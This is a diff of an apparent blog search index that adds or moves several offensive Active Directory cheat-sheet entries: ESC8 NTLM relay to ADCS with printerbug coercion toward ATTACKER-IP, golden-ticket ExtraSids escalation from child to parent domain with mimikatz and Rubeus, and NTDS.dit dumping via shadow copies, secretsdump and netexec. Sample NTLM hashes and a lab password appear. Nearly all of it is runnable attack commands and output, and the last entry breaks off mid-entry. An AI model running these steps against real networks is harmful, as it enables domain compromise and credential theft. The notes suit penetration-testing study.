@@ -394,6 +394,49 @@
       </tags>
   </entry>
   <entry>
+    <title>ADCS : ESC8</title>
+    <url>/2025/11/30/ADCS-ESC8/</url>
+    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
+
+<p>Enumerate ADCS over SMB</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
+
+<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
+<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Or </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>ADCS</category>
+      </categories>
+      <tags>
+        <tag>Certipy</tag>
+        <tag>ESC8</tag>
+        <tag>impacket-ntlmrelayx</tag>
+        <tag>printerbug</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Attacking Child-Parent Trust From Linux</title>
     <url>/2025/12/02/Attacking-Child-Parent-Trust-From-Linux/</url>
     <content><![CDATA[<blockquote>
@@ -454,113 +497,6 @@
         <tag>secretsdump</tag>
         <tag>lookupsid</tag>
         <tag>ticketer</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ADCS : ESC8</title>
-    <url>/2025/11/30/ADCS-ESC8/</url>
-    <content><![CDATA[<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>Search for vulnerable certificate templates</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy find -u username -p password -dc-ip &lt;DC-IP&gt; -target &lt;DC-Name&gt; -enabled -vulnerable -stdout</span><br></pre></td></tr></table></figure>
-
-<p>Identify ADCS Enrollment Services and Certificate Template Names</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc ldap target -u username -p password -M adcs</span><br></pre></td></tr></table></figure>
-
-<p>Enumerate ADCS over SMB</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb target -M enum_ca</span><br></pre></td></tr></table></figure>
-
-<h3 id="Start-NTLM-Relay-to-ADCS-Web-Enrollment"><a href="#Start-NTLM-Relay-to-ADCS-Web-Enrollment" class="headerlink" title="Start NTLM Relay to ADCS Web Enrollment"></a>Start NTLM Relay to ADCS Web Enrollment</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template &lt;CERT-TEMPLATE&gt; --no-http-server --no-wcf-server --no-raw-server</span><br></pre></td></tr></table></figure>
-
-<p>Or</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://&lt;DC-Name.domain&gt;/&#x27;</span> -template &lt;CERT-TEMPLATE&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>➜ After running the coerce tool, these commands will generate a .pfx certificate file for the DC machine.</code></p>
-<h3 id="Force-Machine-Authentication"><a href="#Force-Machine-Authentication" class="headerlink" title="Force Machine Authentication"></a>Force Machine Authentication</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;DC-IP&gt; &lt;ATTACKER-IP&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 gettgtpkinit.py -cert-pfx &lt;PATH-TO-PFX&gt; -dc-ip &lt;DC-IP&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span> &lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Or </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">certipy auth -pfx &lt;OUTPUT-CCACHE&gt; -dc-ip &lt;DC-IP&gt; </span><br></pre></td></tr></table></figure>
-
-
-<h3 id="Set-Kerberos-Cache-to-Use-the-TGT"><a href="#Set-Kerberos-Cache-to-Use-the-TGT" class="headerlink" title="Set Kerberos Cache to Use the TGT"></a>Set Kerberos Cache to Use the TGT</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> KRB5CCNAME=&lt;OUTPUT-CCACHE&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="Perform-DCSync"><a href="#Perform-DCSync" class="headerlink" title="Perform DCSync"></a>Perform DCSync</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass -dc-ip &lt;DC-IP&gt; -just-dc-user &lt;TARGET-USER&gt; <span class="string">&#x27;&lt;DOMAIN&gt;/&lt;MACHINE-ACCOUNT&gt;$&#x27;</span>@&lt;DC-HOSTNAME&gt;</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>ADCS</category>
-      </categories>
-      <tags>
-        <tag>Certipy</tag>
-        <tag>ESC8</tag>
-        <tag>impacket-ntlmrelayx</tag>
-        <tag>printerbug</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Attacking Child-Parent Trust From Windows</title>
-    <url>/2025/12/03/Attacking-Child-Parent-Trust-From-Windows/</url>
-    <content><![CDATA[<h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><blockquote>
-<p>To successfully get access to the parent domain we need first : </p>
-<ul>
-<li>The KRBTGT hash of the child domain ( To Sign the Golden Ticket ).</li>
-<li>The SID of the child domain.</li>
-<li>The FQDN of the child domain.</li>
-<li>The name of a target user in the child domain (doesn’t need to exist!).</li>
-<li>The SID of the Enterprise Admins Group of the parent domain.</li>
-</ul>
-</blockquote>
-<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h3 id="Enumerate-Trust-Relationship"><a href="#Enumerate-Trust-Relationship" class="headerlink" title="Enumerate Trust Relationship"></a>Enumerate Trust Relationship</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br></pre></td></tr></table></figure>
-
-
-<p>➜ We have a <code>bidirectional Trust</code> between <code>Parent</code> and <code>Child</code> Domains.</p>
-<p>➜ We don’t have any SID Filter applied.</p>
-<h3 id="Enumerate-Account-Privs"><a href="#Enumerate-Account-Privs" class="headerlink" title="Enumerate Account Privs"></a>Enumerate Account Privs</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; net user our<span class="literal">-privileged-user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Global <span class="built_in">Group</span> memberships     *Domain Users         *Domain Admins</span><br></pre></td></tr></table></figure>
-
-
-<p>We are <em>Domain Admins</em> so we can DCSync and try ExtraSids Attack ( SID History Abuse)</p>
-<h1 id="Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain"><a href="#Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain" class="headerlink" title="Extract Sid, FQDN And krbtgt Hash Of The Child Domain"></a>Extract Sid, FQDN And krbtgt Hash Of The Child Domain</h1><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:NETBIOS_DOMAIN/krbtgt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line"></span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br></pre></td></tr></table></figure>
-
-
-<p>FQDN : <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
-<p>SID : <code>S-1-5-21-2806153819-209893948-922872689</code>.</p>
-<p>krbtgt Hash : <code>9d765b482771505cbe97411065964d5f</code>.</p>
-<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><p>Get <code>child Domain</code> SID</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainSID</span></span><br><span class="line"></span><br><span class="line">S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br></pre></td></tr></table></figure>
-
-<p>Get <code>Enterprise Admins</code> SID</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-DomainGroup</span> <span class="literal">-Domain</span> parent<span class="literal">-domain</span> <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> | <span class="built_in">select</span> distinguishedname,objectsid</span><br><span class="line"></span><br><span class="line">distinguishedname                                       objectsid</span><br><span class="line"><span class="literal">-----------------</span>                                       <span class="literal">---------</span></span><br><span class="line">CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br></pre></td></tr></table></figure>
-
-
-<h1 id="Craft-A-Golden-Ticket"><a href="#Craft-A-Golden-Ticket" class="headerlink" title="Craft A Golden Ticket"></a>Craft A Golden Ticket</h1><blockquote>
-<p>➜ With this command, we craft a golden ticket for <code>non existing user ( twistzz )</code> and inject in the <code>SID History</code> attribute the SID of the <code>Enterprise Admins</code> Group.</p>
-</blockquote>
-<h3 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># kerberos::golden /user:twistzz /domain:child-domain-FQDN /sid:child-domain-SID /krbtgt:KRBTGT-hash /sids:Enterprise-Admins-SID /ptt</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  .\Rubeus.exe golden /rc4:KRBTGT<span class="literal">-hash</span> /domain:child<span class="literal">-domain-FQDN</span> /sid:child<span class="literal">-domain-SID</span>  /sids:Enterprise<span class="literal">-Admins-SID</span> /user:twistzz /ptt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line">      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJ   &lt;SNIP&gt;   JFSUdIVC5MT0NBTA==</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Access-Files"><a href="#Access-Files" class="headerlink" title="Access Files"></a>Access Files</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; <span class="built_in">type</span> \\dc<span class="literal">-name</span>.parent<span class="literal">-domain</span>\c<span class="variable">$</span>\ExtraSids\script.txt</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="DCSync-Parent-Domain"><a href="#DCSync-Parent-Domain" class="headerlink" title="DCSync Parent Domain"></a>DCSync Parent Domain</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; netdom query /domain:parent<span class="literal">-domain</span> dc</span><br><span class="line">List of domain controllers with accounts <span class="keyword">in</span> the domain:</span><br><span class="line"></span><br><span class="line">dc<span class="literal">-name-of-parent-domain</span></span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /dc:dc-name-of-parent-domain /domain:parent-domain /all /csv</span></span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Windows</category>
-        <category>Exploitation</category>
-        <category>Domain Trusts</category>
-        <category>Abuse Child-Parent Trust From Windows</category>
-      </categories>
-      <tags>
-        <tag>PowerView</tag>
-        <tag>Mimikatz</tag>
-        <tag>Rubeus</tag>
       </tags>
   </entry>
   <entry>
@@ -645,6 +581,70 @@
         <tag>diskshadow</tag>
         <tag>ntds</tag>
         <tag>active-directory</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Attacking Child-Parent Trust From Windows</title>
+    <url>/2025/12/03/Attacking-Child-Parent-Trust-From-Windows/</url>
+    <content><![CDATA[<h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><blockquote>
+<p>To successfully get access to the parent domain we need first : </p>
+<ul>
+<li>The KRBTGT hash of the child domain ( To Sign the Golden Ticket ).</li>
+<li>The SID of the child domain.</li>
+<li>The FQDN of the child domain.</li>
+<li>The name of a target user in the child domain (doesn’t need to exist!).</li>
+<li>The SID of the Enterprise Admins Group of the parent domain.</li>
+</ul>
+</blockquote>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h3 id="Enumerate-Trust-Relationship"><a href="#Enumerate-Trust-Relationship" class="headerlink" title="Enumerate Trust Relationship"></a>Enumerate Trust Relationship</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br></pre></td></tr></table></figure>
+
+
+<p>➜ We have a <code>bidirectional Trust</code> between <code>Parent</code> and <code>Child</code> Domains.</p>
+<p>➜ We don’t have any SID Filter applied.</p>
+<h3 id="Enumerate-Account-Privs"><a href="#Enumerate-Account-Privs" class="headerlink" title="Enumerate Account Privs"></a>Enumerate Account Privs</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; net user our<span class="literal">-privileged-user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Global <span class="built_in">Group</span> memberships     *Domain Users         *Domain Admins</span><br></pre></td></tr></table></figure>
+
+
+<p>We are <em>Domain Admins</em> so we can DCSync and try ExtraSids Attack ( SID History Abuse)</p>
+<h1 id="Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain"><a href="#Extract-Sid-FQDN-And-krbtgt-Hash-Of-The-Child-Domain" class="headerlink" title="Extract Sid, FQDN And krbtgt Hash Of The Child Domain"></a>Extract Sid, FQDN And krbtgt Hash Of The Child Domain</h1><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /user:NETBIOS_DOMAIN/krbtgt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="type">DC</span>] <span class="string">&#x27;LOGISTICS.INLANEFREIGHT.LOCAL&#x27;</span> will be the domain</span><br><span class="line"></span><br><span class="line">Object Security ID   : S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: <span class="number">9</span>d765b482771505cbe97411065964d5f</span><br></pre></td></tr></table></figure>
+
+
+<p>FQDN : <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>
+<p>SID : <code>S-1-5-21-2806153819-209893948-922872689</code>.</p>
+<p>krbtgt Hash : <code>9d765b482771505cbe97411065964d5f</code>.</p>
+<h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><p>Get <code>child Domain</code> SID</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-DomainSID</span></span><br><span class="line"></span><br><span class="line">S<span class="literal">-1-5-21-2806153819-209893948-922872689</span></span><br></pre></td></tr></table></figure>
+
+<p>Get <code>Enterprise Admins</code> SID</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; <span class="built_in">Get-DomainGroup</span> <span class="literal">-Domain</span> parent<span class="literal">-domain</span> <span class="literal">-Identity</span> <span class="string">&quot;Enterprise Admins&quot;</span> | <span class="built_in">select</span> distinguishedname,objectsid</span><br><span class="line"></span><br><span class="line">distinguishedname                                       objectsid</span><br><span class="line"><span class="literal">-----------------</span>                                       <span class="literal">---------</span></span><br><span class="line">CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-519</span></span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Craft-A-Golden-Ticket"><a href="#Craft-A-Golden-Ticket" class="headerlink" title="Craft A Golden Ticket"></a>Craft A Golden Ticket</h1><blockquote>
+<p>➜ With this command, we craft a golden ticket for <code>non existing user ( twistzz )</code> and inject in the <code>SID History</code> attribute the SID of the <code>Enterprise Admins</code> Group.</p>
+</blockquote>
+<h3 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># kerberos::golden /user:twistzz /domain:child-domain-FQDN /sid:child-domain-SID /krbtgt:KRBTGT-hash /sids:Enterprise-Admins-SID /ptt</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  .\Rubeus.exe golden /rc4:KRBTGT<span class="literal">-hash</span> /domain:child<span class="literal">-domain-FQDN</span> /sid:child<span class="literal">-domain-SID</span>  /sids:Enterprise<span class="literal">-Admins-SID</span> /user:twistzz /ptt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line">      doIF0zCCBc+gAwIBBaEDAgEWooIEnDCCBJ   &lt;SNIP&gt;   JFSUdIVC5MT0NBTA==</span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Access-Files"><a href="#Access-Files" class="headerlink" title="Access Files"></a>Access Files</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; <span class="built_in">type</span> \\dc<span class="literal">-name</span>.parent<span class="literal">-domain</span>\c<span class="variable">$</span>\ExtraSids\script.txt</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="DCSync-Parent-Domain"><a href="#DCSync-Parent-Domain" class="headerlink" title="DCSync Parent Domain"></a>DCSync Parent Domain</h1><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools\mimikatz\x64&gt; netdom query /domain:parent<span class="literal">-domain</span> dc</span><br><span class="line">List of domain controllers with accounts <span class="keyword">in</span> the domain:</span><br><span class="line"></span><br><span class="line">dc<span class="literal">-name-of-parent-domain</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::dcsync /dc:dc-name-of-parent-domain /domain:parent-domain /all /csv</span></span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Exploitation</category>
+        <category>Domain Trusts</category>
+        <category>Abuse Child-Parent Trust From Windows</category>
+      </categories>
+      <tags>
+        <tag>PowerView</tag>
+        <tag>Mimikatz</tag>
+        <tag>Rubeus</tag>
       </tags>
   </entry>
   <entry>
@@ -870,6 +870,43 @@
       </tags>
   </entry>
   <entry>
+    <title>Dump NTDS</title>
+    <url>/2025/11/26/Dump-NTDS/</url>
+    <content><![CDATA[<p>➜ Required privilege </p>
+<ul>
+<li><p><code>Member of Domain Admins (DA)</code></p>
+</li>
+<li><p><code>Member of Enterprise Admins (EA)</code></p>
+</li>
+<li><p><code>Member of local Administrators group on the DC</code></p>
+</li>
+<li><p><code>Backup Operators ( SeBackupPrivilege )</code></p>
+</li>
+</ul>
+<h1 id="Offline"><a href="#Offline" class="headerlink" title="Offline"></a>Offline</h1><h3 id="Creating-shadow-copy-of-C"><a href="#Creating-shadow-copy-of-C" class="headerlink" title="Creating shadow copy of C:"></a>Creating shadow copy of C:</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\&gt; vssadmin CREATE SHADOW /For=C:</span><br><span class="line"></span><br><span class="line">Successfully created shadow copy <span class="keyword">for</span> <span class="string">&#x27;C:\&#x27;</span></span><br><span class="line">    Shadow Copy ID: &#123;186d5979-2f2b-4afe-8101-9f1111e4cb1a&#125;</span><br><span class="line">    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</span><br></pre></td></tr></table></figure>
+
+<h3 id="Copying-NTDS-dit-from-the-VSS"><a href="#Copying-NTDS-dit-from-the-VSS" class="headerlink" title="Copying NTDS.dit from the VSS"></a>Copying NTDS.dit from the VSS</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\NTDS&gt; cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Dump-hashes"><a href="#Dump-hashes" class="headerlink" title="Dump hashes"></a>Dump hashes</h3><p>➜ Since the hashes stored in <code>NTDS.dit</code> are encrypted with a key stored in <code>SYSTEM</code>, we need to transfer the <code>SYSTEM</code> registry with <code>NTDS.dit</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Remotely"><a href="#Remotely" class="headerlink" title="Remotely"></a>Remotely</h1><h3 id="NetExec"><a href="#NetExec" class="headerlink" title="NetExec"></a>NetExec</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil</span><br><span class="line"></span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::</span><br><span class="line">NTDSUTIL    10.129.201.57   445     DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+
+]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Windows</category>
+        <category>Post-Exploitation</category>
+        <category>Dump-Passwords</category>
+      </categories>
+      <tags>
+        <tag>Dump-NTDS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Enumerating &amp; Retrieving Password Policies</title>
     <url>/2025/12/03/Enumerating-Retrieving-Password-Policies/</url>
     <content><![CDATA[<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h3 id="Using-Valid-Domain-Credential"><a href="#Using-Valid-Domain-Credential" class="headerlink" title="Using Valid Domain Credential"></a>Using Valid Domain Credential</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nxc smb dc-ip -u username -p password --pass-pol</span><br></pre></td></tr></table></figure>
@@ -900,6 +937,74 @@
         <tag>rpcclient</tag>
         <tag>ldapsearch</tag>
         <tag>enum4linux-ng</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Event Log Readers</title>
+    <url>/2026/03/06/Event-Log-Readers/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Event Log Readers is a Windows group that allows its members to read system and security event logs. These logs may contain details about executed programs and command-line arguments, which can sometimes expose sensitive information such as usernames and passwords.</p>
+</blockquote>
+<h4 id="Searching-Security-Logs-with-wevtutil"><a href="#Searching-Security-Logs-with-wevtutil" class="headerlink" title="Searching Security Logs with wevtutil"></a>Searching Security Logs with <code>wevtutil</code></h4><blockquote>
+<p>➜ The <code>wevtutil</code> utility can be used to query the Security event log and search for commands that contain user credentials :</p>
+</blockquote>
